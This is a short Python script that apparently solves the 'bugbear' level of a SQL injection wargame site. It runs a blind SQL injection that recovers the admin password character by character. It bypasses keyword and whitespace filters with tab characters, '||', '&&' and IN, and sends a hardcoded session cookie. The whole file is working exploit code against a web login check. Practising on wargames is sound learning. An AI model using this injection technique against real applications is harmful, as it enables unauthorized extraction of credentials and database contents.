import urllib.request
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url='http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=2%09||%09id%09in("admin")%09%26%26%09left(pw,{0})%09IN("{pwarr}{asciiarr}")'.format(i,pwarr=pw,asciiarr=arr[j])
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		if data.find("Hello admin") != -1 :
			pw = pw + arr[j]
			print("This is    "+arr[j])
			break
print(pw)
url='http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw={}'.format(pw)
r = urllib.request.Request(url)
r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
data = urllib.request.urlopen(r).read().decode("utf-8")